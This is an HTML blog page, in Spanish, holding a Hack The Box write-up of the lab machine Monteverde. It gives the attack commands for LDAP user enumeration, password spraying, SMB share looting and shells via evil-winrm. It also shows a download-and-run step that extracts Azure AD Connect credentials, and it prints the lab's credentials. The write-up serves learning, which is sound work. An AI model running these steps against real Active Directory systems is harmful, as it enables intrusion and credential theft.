@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB Monteverde Write-up (Español)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Monteverde Write-up (Español) | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB Monteverde Write-up (Español)" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I cloned my writeup that was originally posted on medium" />
+<meta property="og:description" content="I cloned my writeup that was originally posted on medium" />
+<link rel="canonical" href="http://localhost:8000/Monteverde-Espa%C3%B1ol" />
+<meta property="og:url" content="http://localhost:8000/Monteverde-Espa%C3%B1ol" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/Monteverde/1__k1dpAMSzJOaosR1KtzrueA.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-06-13T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/Monteverde/1__k1dpAMSzJOaosR1KtzrueA.png" />
+<meta property="twitter:title" content="HTB Monteverde Write-up (Español)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-06-13T00:00:00-05:00","datePublished":"2020-06-13T00:00:00-05:00","description":"I cloned my writeup that was originally posted on medium","headline":"HTB Monteverde Write-up (Español)","image":"http://localhost:8000/assets/images/Monteverde/1__k1dpAMSzJOaosR1KtzrueA.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Monteverde-Espa%C3%B1ol"},"url":"http://localhost:8000/Monteverde-Espa%C3%B1ol"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/Monteverde/1__k1dpAMSzJOaosR1KtzrueA.png/../banner.png>
+  
+  <h2>HTB Monteverde Write-up (Español)</h2>
+  <time datetime="2020-06-13T00:00:00-05:00" class="by-line">13 Jun 2020</time>
+  <p>I cloned my writeup that was originally posted on <a href="https://medium.com/@5ubterranean/htb-monteverde-write-up-espa%C3%B1ol-298d2709ee59">medium</a></p>
+
+<p>Monteverde es una máquina basada en Windows que estuvo activa desde el 11 de Enero del 2020 hasta el 13 de Junio, empezaremos enumerando usuarios con ldapsearch, probaremos un ataque por diccionario y obtendremos que un usuario usa su username también como contraseña, revisando los archivos a los que tiene acceso este usuario encontraremos credenciales de otro usuario, este nuevo usuario es parte del grupo Azure Admins, pertenecer a este grupo nos permitirá extraer la credenciales de Administrador de la base de datos presente en la máquina.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 — <span class="nv">rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0–65535 10.10.10.172  
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 49673,49675,49674,49667,9389,3268,445,53,5985,464,56439,389,3269,593,88,636,139,135, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.172
+
+PORT      STATE SERVICE       VERSION  
+53/tcp    open  domain?  
+| fingerprint-strings:   
+|   DNSVersionBindReqTCP:   
+|     version  
+|<span class="se">\_</span>    <span class="nb">bind  
+</span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-04-25 02:23:28Z<span class="o">)</span>  
+135/tcp   open  msrpc         Microsoft Windows RPC  
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>  
+445/tcp   open  microsoft-ds?  
+464/tcp   open  kpasswd5?  
+593/tcp   open  ncacn<span class="se">\_</span>http    Microsoft Windows RPC over HTTP 1.0  
+636/tcp   open  tcpwrapped  
+3268/tcp  open  ldap  
+3269/tcp  open  tcpwrapped  
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>  
+|<span class="se">\_</span>http-server-header: Microsoft-HTTPAPI/2.0  
+|<span class="se">\_</span>http-title: Not Found  
+9389/tcp  open  mc-nmf        .NET Message Framing  
+49667/tcp open  msrpc         Microsoft Windows RPC  
+49673/tcp open  ncacn<span class="se">\_</span>http    Microsoft Windows RPC over HTTP 1.0  
+49674/tcp open  msrpc         Microsoft Windows RPC  
+49675/tcp open  msrpc         Microsoft Windows RPC  
+56439/tcp open  msrpc         Microsoft Windows RPC
+</code></pre></div></div>
+
+<p>Tenemos diversos puertos abiertos, pero ya que tenemos LDAP disponible empezamos por ahí, usamos <code class="language-plaintext highlighter-rouge">ldapsearch</code>, hacemos una petición por el naming context para confirmar el dominio obtenido por nmap: <code class="language-plaintext highlighter-rouge">ldapsearch -x -h 10.10.10.172 -s base namingcontexts</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__prwEwmnRqPhm1r4YiQoX4A.png" alt="" /></p>
+
+<p>Bien, confirmamos que el dominio es MEGABANK.LOCAL, ahora enumeramos todos los usuarios disponibles, esto se hace haciendo una petición especificando que solo nos devuelva las entradas donde “objectclass” sea de tipo “user”, y filtramos para crear una lista: <code class="language-plaintext highlighter-rouge">ldapsearch -x -h 10.10.10.172 -b "DC=MEGABANK,DC=LOCAL" 'objectClass=user' | grep sAMAccountName | awk '{print $2}'</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__LLKhMxOlLWVk2bKvJkjKJg.png" alt="" /></p>
+
+<p>Los tres primeros usuarios, Guest, MONTEVERDE$ y AAD_987d7f2f57d2 son unos creados automáticamente por el servidor, ya que no hay forma de conseguir sus contraseñas por fuerza bruta o diccionario las quitamos de la lista y la guardamos como “users.txt”, ahora usamos <code class="language-plaintext highlighter-rouge">crackmapexec</code> para atacar el servidor usando “users.txt” como lista de usuarios y contraseñas: <code class="language-plaintext highlighter-rouge">cme smb 10.10.10.172 -u users.txt -p users.txt</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__TtX8RgnXTFTKDqL4F0fZ7w.png" alt="" /></p>
+
+<h1 id="ganando-acceso">Ganando acceso</h1>
+
+<p>Encontramos que “SABatchJobs” es usado como usuario y contraseña de una cuenta, volvemos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para comprobar a qué cosas tiene acceso esta cuenta: <code class="language-plaintext highlighter-rouge">cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -- shares</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__1sKWfvhCs7j199eVFfD2HQ.png" alt="" /></p>
+
+<p>Tenemos acceso de lectura a unas cuantas carpetas compartidas, en <a href="https://medium.com/@5ubterranean/htb-nest-write-up-espa%C3%B1ol-ae4cc92a7a4f">Nest</a> monté las carpetas compartidas y usé <code class="language-plaintext highlighter-rouge">tree</code> para revisarlas, en este casó usaremos <code class="language-plaintext highlighter-rouge">smbmap</code> para cumplir el mismo objetivo, para esto usamos: <code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__MD5FhKdRSv6nHrmsuZmjXQ.png" alt="" /></p>
+
+<p>Solo muestro el comienzo de la salida ya que es mucho más larga, pero esto nos cumple el mismo cometido, nos lista los contenidos de todas las carpetas compartidas a las que tenemos acceso, lo más interesante que vemos es que tenemos acceso a la carpeta compartida del usuario “mhope” en “users$”.</p>
+
+<p><img src="/assets/images/Monteverde/1__EEeaf2eop__UuvI4hlgfd3A.png" alt="" /></p>
+
+<p>Nos conectamos a la carpeta compartida usando smbclient, <code class="language-plaintext highlighter-rouge">smbclient \\\\10.10.10.172\\users$ -U SABatchJobs</code>, y descargamos el archivo “azure.xml”, al leerlo nos encontramos con una contraseña.</p>
+
+<p><img src="/assets/images/Monteverde/1__KnWNb88I0HBk3Gov4avGiA.png" alt="" /></p>
+
+<p>Si bien encontramos esta contraseña dentro de la carpeta de “mhope”, usamos crackmapexec para confirmar que no sea de otro usuario, <code class="language-plaintext highlighter-rouge">cme smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$'</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__Mhe4WXYZIn__AaokcmLdpTA.png" alt="" /></p>
+
+<p>Usamos <code class="language-plaintext highlighter-rouge">evil-winrm</code> para conseguir una shell en la máquina, <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.172 -u mhope-p '4n0therD4y@n0th3r$'</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__fG5FGRBoUC8oqnda1GnHhA.png" alt="" /></p>
+
+<p>Y conseguimos el “user.txt”.</p>
+
+<h1 id="escalación-de-privilegios">Escalación de privilegios</h1>
+
+<p>Revisamos a qué grupos pertenece este usuario con <code class="language-plaintext highlighter-rouge">whoami /all</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__0ItXSn6tKnaYiP__3JUnG2Q.png" alt="" /></p>
+
+<p>El grupo más interesante de estos es “Azure Admins”, buscamos formas de usar este grupo para escalar privilegios y nos encontramos este <a href="https://github.com/fox-it/adconnectdump">github</a> con algunos scripts para extraer credenciales de Azure AD, este nos da un link a un <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">blog</a> con un script que hace lo mismo, usaremos este último y lo guardaremos como “azuread_decrypt_msol.ps1”, lo descargamos a la máquina objetivo usando <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>, en nuestra máquina e <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code>, en la máquina Windows, y procedemos a ejecutarlo.</p>
+
+<p><img src="/assets/images/Monteverde/1__r4bIgPAAJI6DC__9mRhR07w.png" alt="" /></p>
+
+<p>El script no funciona, y nos da una larga cadena de errores, ya que es un script podemos ejecutarlo línea por línea para encontrar la que provoca el error.</p>
+
+<p><img src="/assets/images/Monteverde/1__QpVhjfFs7KB8DAvMPYwVpg.png" alt="" /></p>
+
+<p>La segunda línea es la que provoca el error, aunque esta actúa según lo especificado en la primera, y el error nos indica que no pudo encontrar el servidor, la línea original es <code class="language-plaintext highlighter-rouge">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync”</code>, luego de hacer unas pruebas encontramos que debemos cambiar “Data Source” el cual indica el servidor y la base de datos, por “server” y “database” que indica lo mismo pero en dos valores separados, además tenemos que agregar “Intedrated Security = True”, por lo que la primera línea ahora será: <code class="language-plaintext highlighter-rouge">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “server=localhost;database=ADSync;Initial Catalog=ADSync;Integrated Security = True”</code>, ahora que hemos modificado el script volvemos a subirlo a la máquina y lo ejecutamos.</p>
+
+<p><img src="/assets/images/Monteverde/1__M57GzvJ07oOCYVIt__STdsw.png" alt="" /></p>
+
+<p>Obtenemos las credenciales de administrator, Username: administrator Password: d0m@in4dminyeah!, nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+
+<p><img src="/assets/images/Monteverde/1__tIqNEfI__QmTteWr3__g__9XQ.png" alt="" /></p>
+
+<p>Y conseguimos el “root.txt”, con esto hemos terminado con la máquina.</p>
+
+<h1 id="descargo-de-responsabilidad">Descargo de responsabilidad</h1>
+
+<p>Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#active-directory"> Active Directory</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
